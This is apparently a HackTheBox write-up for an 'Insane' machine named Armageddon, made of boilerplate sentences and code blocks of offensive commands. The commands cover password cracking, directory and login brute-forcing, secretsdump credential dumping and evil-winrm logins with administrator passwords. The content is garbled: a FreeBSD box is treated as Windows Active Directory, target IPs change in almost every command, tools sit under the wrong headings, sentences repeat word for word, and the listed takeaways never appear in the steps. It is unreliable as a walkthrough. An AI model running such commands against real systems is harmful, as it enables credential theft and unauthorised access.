---
TitleSEO: "HackTheBox — Armageddon (Insane FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Armageddon (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Armageddon. AlwaysInstallElevated and LAPS Abuse to achieve insane compromise on FreeBSD."
Keywords: "linux, forensics, windows, hackthebox, insane, active directory"
URL: "https://zurefx.github.io/writeups/htb-armageddon-221.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-221/"
Date: "2025-02-27"
Tags: "Linux, Forensics, Windows, HackTheBox, Insane, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-221"
Permalink: "/writeups/htb-armageddon-221.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Armageddon** is rated **Insane** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.121.210.104`.

### Objectives

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.121.195.132/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.39.127.132/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.124.173
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.73.215 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p23,23,53 10.27.156.123 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.183.228
```

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files.

Key finding: **Remote File Inclusion**.

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.70.216.2 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.15.104.160
nmap -sCV -p9200,21,3268 10.77.220.5 -oN scan.txt
crackmapexec smb 10.54.23.166 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
gobuster dir -u http://10.114.124.42/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.62.144/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.142.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.229.113
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `rubeus`
- `impacket`
- `rpcclient`
- `chisel`
- `msfvenom`
- `atexec`
- `GetUserSPNs`

### Key Takeaways

- AlwaysInstallElevated
- LAPS Abuse
- Remote File Inclusion
